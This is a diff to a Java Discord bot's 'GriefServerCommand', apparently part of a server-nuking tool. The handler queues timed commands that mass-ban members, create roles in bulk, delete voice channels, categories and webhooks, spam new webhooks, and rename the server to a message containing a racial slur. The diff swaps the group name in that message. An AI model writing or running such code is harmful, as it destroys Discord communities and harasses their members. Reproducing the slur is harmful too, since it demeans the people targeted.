@@ -11,6 +11,7 @@ import java.util.concurrent.TimeUnit;
 public class GriefServerCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+
         int i = 1;
 
              event.getChannel().sendMessage(Core.PREFIX + "banwave").queueAfter(i++, TimeUnit.SECONDS);
@@ -18,7 +19,7 @@ public class GriefServerCommand implements ICommand {
             event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY POODLECOORP LLL NIGGA LLL").queueAfter(i++, TimeUnit.SECONDS);
+            event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(i++, TimeUnit.SECONDS);
            // event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(i++, TimeUnit.SECONDS);
